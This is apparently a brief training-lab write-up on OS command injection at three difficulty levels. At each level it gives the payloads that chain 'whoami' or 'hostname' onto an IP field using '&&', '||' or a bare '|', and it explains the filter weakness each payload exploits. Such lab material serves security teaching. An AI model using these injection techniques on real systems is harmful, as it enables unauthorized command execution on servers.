# Low:

### User
127.0.0.1 && whoami

### Hostname
127.0.0.1 && hostname


# MEDIUM:
The input is now being filtered. It replaces '&&' and ';' with empty character. So we now need to use other operator to chain commands. We will use OR ( || ) operator with an invalid ip.

### User
lol || whoami

### Hostname
lol || hostname

# HARD
This time most of the operator is being filtered. But there is a typo. Instead of filtering "|", "| " is being filtered. So we can easily chai command with "|" without any whitespace.

### User
lol|whoami

### Hostname
lol|hostname